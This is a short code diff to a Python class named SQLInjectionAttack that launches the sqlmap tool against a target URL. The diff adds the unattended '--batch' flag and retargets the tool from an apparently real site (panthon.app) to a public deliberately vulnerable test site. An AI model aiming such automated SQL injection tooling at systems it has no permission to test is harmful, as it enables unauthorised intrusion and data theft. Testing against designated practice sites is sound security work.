@@ -26,11 +26,11 @@ class SQLInjectionAttack:
     def sqlmap_attack(self):
         logging.info("Attacking %s with SQLMap...", self.target_url)
         path_to_executable = os.path.join(os.path.dirname(__file__), "sqlmap/sqlmap.py")
-        command = ["python3", path_to_executable, "-u", self.target_url]
+        command = ["python3", path_to_executable, "-u", self.target_url, "--batch"]
         subprocess.run(command)
 
 
 sql_injection_attack = SQLInjectionAttack(
-    "https://panthon.app", attack_type="sqlmap"
+    "http://testphp.vulnweb.com/?id=1", attack_type="sqlmap"
 )  # target_url, attack_type
 sql_injection_attack.simulate_attack()
